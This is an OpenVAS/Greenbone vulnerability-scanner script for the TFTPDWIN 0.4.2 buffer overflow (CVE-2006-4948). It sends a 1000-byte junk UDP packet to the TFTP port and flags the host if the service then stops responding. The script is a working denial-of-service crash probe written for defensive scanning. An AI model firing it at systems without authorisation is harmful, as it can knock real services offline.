if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.100265" );
	script_version( "2020-11-10T09:46:51+0000" );
	script_tag( name: "last_modification", value: "2020-11-10 09:46:51 +0000 (Tue, 10 Nov 2020)" );
	script_tag( name: "creation_date", value: "2009-08-31 21:01:49 +0200 (Mon, 31 Aug 2009)" );
	script_bugtraq_id( 20131 );
	script_cve_id( "CVE-2006-4948" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "ProSysInfo TFTPDWIN Remote Buffer Overflow Vulnerability" );
	script_category( ACT_DENIAL );
	script_family( "Denial of Service" );
	script_copyright( "Copyright (C) 2009 Greenbone Networks GmbH" );
	script_dependencies( "tftpd_detect.sc", "global_settings.sc", "os_detection.sc" );
	script_require_udp_ports( "Services/udp/tftp", 69 );
	script_mandatory_keys( "tftp/detected" );
	script_require_keys( "Host/runs_windows" );
	script_exclude_keys( "keys/TARGET_IS_IPV6" );
	script_tag( name: "affected", value: "TFTPDWIN 0.4.2 is vulnerable. Other versions may be affected as well." );
	script_tag( name: "summary", value: "TFTPDWIN server is prone to a remote buffer-overflow vulnerability
  because the application fails to properly bounds-check user-supplied
  input before copying it to an insufficiently sized memory buffer." );
	script_tag( name: "impact", value: "An attacker may exploit this issue to execute arbitrary code in the
  context of the TFTP server process." );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/20131" );
	script_tag( name: "qod_type", value: "exploit" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	exit( 0 );
}
if(TARGET_IS_IPV6()){
	exit( 0 );
}
require("tftp.inc.sc");
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
port = service_get_port( default: 69, proto: "tftp", ipproto: "udp" );
if(!tftp_alive( port: port )){
	exit( 0 );
}
soc = open_sock_udp( port );
if(!soc){
	exit( 0 );
}
boom = crap( 1000 );
send( socket: soc, data: boom );
sleep( 1 );
close( soc );
if(!tftp_alive( port: port )){
	security_message( port: port, proto: "udp" );
	exit( 0 );
}
exit( 99 );

